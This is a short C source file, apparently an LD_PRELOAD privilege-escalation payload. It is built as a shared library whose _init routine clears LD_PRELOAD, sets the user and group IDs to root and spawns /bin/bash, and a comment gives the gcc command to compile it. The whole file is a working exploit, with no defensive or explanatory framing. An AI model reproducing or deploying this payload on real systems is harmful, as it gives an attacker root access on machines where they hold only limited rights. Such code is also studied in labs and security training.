#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

// this needs to be compiled like:
// gcc -fPIC -shared -o name.so name.c -nostartfiles

void _init(){
	
	// unload currnet librarys
	unsetenv("LD_PRELOAD");
	// set group ID to root group ID
	setgid(0);
	//set user ID to root user ID
	setuid(0);
	// spawn a new shell with the IDs set above
	system("/bin/bash");
}
